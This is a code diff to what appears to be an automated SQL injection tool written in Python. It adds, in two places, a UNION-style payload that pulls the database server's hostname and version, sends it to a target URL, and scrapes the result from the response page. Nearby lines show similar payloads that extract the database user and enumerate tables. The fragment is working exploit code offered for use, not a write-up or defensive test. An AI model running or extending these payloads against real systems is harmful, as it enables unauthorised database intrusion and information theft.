@@ -733,6 +733,15 @@ if target_url:
                                               
 
                                         print("[INFO] Starting Enumerate table name DBMS...")
+                                        payload_2 = "(SELECT+GROUP_CONCAT(@@hostname,'::',version()))"
+                                        get_user = re.sub(r"\b{}".format(num_countss), payload_2, payload)
+                                        results_get_user = requests.get(target_url + get_user)
+                                        html_cont = results_get_user.text
+                                        userss = r"\b\w+@\b\w+::\b"
+                                        dump_all = re.findall(userss, html_cont)
+                                        for user in dump_all:
+                                            print("[-] Host name :", user)
+                                        
                                         payload_2 = "(SELECT+GROUP_CONCAT(user(),'::',version()))"
                                         get_user = re.sub(r"\b{}".format(num_countss), payload_2, payload)
                                         results_get_user = requests.get(target_url + get_user)
@@ -1480,6 +1489,15 @@ if target_url:
                                             print("web server operating version : MySQL >= 11.4 ")
 
                                         print("[INFO] Starting Enumerate table name DBMS...")
+                                        payload_2 = "(SELECT+GROUP_CONCAT(@@hostname,'::',version()))"
+                                        get_user = re.sub(r"\b{}".format(num_countss), payload_2, payload)
+                                        results_get_user = requests.get(target_url + get_user)
+                                        html_cont = results_get_user.text
+                                        userss = r"\b\w+@\b\w+::\b"
+                                        dump_all = re.findall(userss, html_cont)
+                                        for user in dump_all:
+                                            print("[-] Host name :", user)
+                                            
                                         payload_2 = "(SELECT+GROUP_CONCAT(user(),'::',version()))"
                                         get_user = re.sub(r"\b{}".format(num_countss), payload_2, payload)
                                         results_get_user = requests.get(target_url + get_user)
